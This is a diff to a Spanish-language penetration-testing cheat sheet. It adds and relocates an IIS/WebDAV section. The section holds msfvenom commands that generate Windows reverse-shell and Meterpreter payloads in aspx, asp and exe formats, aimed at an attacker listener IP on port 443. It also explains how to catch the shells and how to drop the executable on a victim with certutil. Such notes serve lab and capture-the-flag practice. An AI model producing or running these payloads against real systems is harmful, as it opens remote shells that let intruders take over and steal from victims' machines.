@@ -47,6 +47,29 @@ Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un s
 
 # Ejecutamos el binario que subimos a Linux y ganamos acceso
 ```
+
+## IIS - WebDAV
+
+```bash 
+# Estos archivos son el equivalente de un archivo cmd.php en un servidor Apache de Linux que te crean una Revershell. Para los aspx/asp funcionan como una Revershell pero para un IIS en Windows.
+
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=443 -f aspx -o reverse.aspx    # Stageless 
+	# Si la maquina no es x64, podemos quitar esa parte en el payload y convertirla a x86
+	# Recibiremos la Revershell con 'Netcat'
+
+❯ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.1 LPORT=443 -f exe -o reverse.exe  # Stageless  
+	# Recibiremos la Revershell con 'Metasploit' usando el modulo de 'multi_handler' y nos dara una consola con 'Meterpreter'
+	# Esta Revershell la transferiremos desde nuestra maquina de atacante con python3 y en la maquina victima lo descargaremos con 'Certutil.exe' en el dir 'C:\Users\Public\Downloads' para despues ejecutarlo y obtener la Revershell
+	# En 'Metasploit' cuando usamos el 'multi_handler' debemos de cambiar al 'Payload' que colocamos en el comando 
+	# Esto lo hacemos en las maquinas Windows  
+	
+
+❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.68.1 LPORT=443 -f asp > shell.asp
+	# p = PLayload 
+	# f = Formato
+
+❯ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.68.1 LPORT=443 -f aspx > shell.aspx
+```
 ## Tomcat 
 
 ```bash 
@@ -57,16 +80,6 @@ Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un s
 	# LPORT = Local Port 'Atacante'
 	# f = Formato
 	# o = Exportar como 
-```
-
-## IIS - WebDAV
-
-```bash 
-❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.68.1 LPORT=1234 -f asp > shell.asp
-	# p = PLayload 
-	# f = Formato
-
-❯ msfvenom -p windows/shell/reverse_tcp LHOST=192.168.68.1 LPORT=1234 -f asp > shell.aspx
 ```
 
 ## Android APK
